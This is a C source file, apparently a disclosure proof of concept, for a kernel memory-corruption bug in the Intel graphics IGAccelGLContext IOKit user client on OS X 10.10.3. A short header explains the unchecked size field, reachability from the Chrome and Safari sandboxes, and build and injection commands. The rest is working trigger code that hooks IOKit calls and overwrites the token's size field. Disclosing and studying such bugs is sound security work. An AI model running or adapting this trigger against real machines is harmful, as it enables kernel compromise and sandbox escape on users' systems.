/*
the dword at offset 0x10 of the BindQueryBufferMultiple token used by the IGAccelGLContext user client is used as the size
parameter in a memory-modifying loop without any bounds checking

build:
  clang -Wall -dynamiclib -o ig_bind_qbm.dylib ig_bind_qbm.c -framework IOKit -arch i386 -arch x86_64

repro:
  DYLD_INSERT_LIBRARIES=./ig_bind_qbm.dylib  /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --single-process --no-sandbox

IMPACT:
This userclient can be instantiated in the chrome GPU process sandbox and the safari renderer sandbox.

tested on: MacBookAir5,2 w/ 10.10.3/14D131
*/


#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void* token_buf = 0;

kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
  
  if (memoryType == 0){
    token_buf = *atAddress;
  }
  return ret;
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
  if (selector == 2){
    if (token_buf != 0){
      uint16_t needle = 0x8b00; // Indirectstatebaseaddress
      
      uint32_t* at = memmem(token_buf, 0x1000, &needle, 2);
      static int count = 0;

      if (at && count++ > 10){
        printf("***********found it ************\n");
        for(int i = 0; i < 10; i++) {
          printf("%08x\n", at[i]);
        }
        *((uint16_t*)at) = (uint16_t)(0x8b00 + 0x1500);
        at[0x10/4] = 0x12345678;
        //at[0x4/4] = 0x0;
        //at[0x8/4] = 0x0;
        //at[0xc/4] = 0x0;

      }
      
    }
  }

  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
    };

